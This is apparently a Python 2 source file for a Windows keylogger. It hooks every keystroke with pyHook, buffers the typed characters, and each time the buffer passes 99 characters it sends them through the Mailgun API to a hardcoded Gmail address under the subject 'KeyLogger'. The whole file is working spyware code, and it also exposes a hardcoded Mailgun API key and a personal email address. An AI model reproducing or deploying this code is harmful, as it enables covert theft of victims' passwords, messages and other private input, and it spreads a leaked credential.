import pyHook
import pythoncom
import requests

destination = "davidgreydanus@gmail.com"

captured = ''

def send_email(message):
    return requests.post(
        "https://api.mailgun.net/v3/sandboxcbc8dc55033f4621a54adc066bdd68b9.mailgun.org/messages",
        auth=("api", "key-f1fde5c9fa68064a4892d9e39e126244"),
        data={"from": "Excited User <mailgun@sandboxcbc8dc55033f4621a54adc066bdd68b9.mailgun.org>",
              "to": ["davidgreydanus@gmail.com"],
              "subject": "KeyLogger",
              "text": message})



def onKeyboardEvent(event):
    global captured
    if event.Ascii == 5 or not isinstance(event.Ascii, int):
        print 1
    if event.Ascii != 0 and event.Ascii != 8:
       captured += unichr(event.Ascii)
       if len(captured) > 99:
           send_email(captured)
           captured = ''
        
hm = pyHook.HookManager()

hm.KeyDown = onKeyboardEvent

hm.HookKeyboard()

pythoncom.PumpMessages()